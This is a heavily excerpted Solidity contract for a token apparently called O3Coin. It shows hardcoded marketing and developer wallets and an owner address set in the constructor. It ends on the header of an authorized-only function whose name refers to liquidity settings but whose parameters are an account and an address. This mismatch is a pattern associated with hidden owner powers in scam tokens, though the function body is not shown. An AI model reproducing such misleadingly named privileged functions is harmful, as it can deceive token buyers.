...
// Telegram : https://t.me/o3chain
// Website  : https://o3chain.org/
...
contract O3Coin is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xf6141880Bb50b0db26E638c44C75AF42F7812E68); 
    address payable public Wallet_Dev = payable(0x3CCA16DFa654471Dfec13b21BB3ca7921747e7F7);
    ...
    string private constant _name = "O3Coin"; 
    string private constant _symbol = unicode"O3"; 
    ...
    constructor () {
        ...
        _owner = 0x3CCA16DFa654471Dfec13b21BB3ca7921747e7F7;
    ...
    function setNumTokensSellToAddToLiquidity(uint256 acc, address adr) authorized() public virtual {
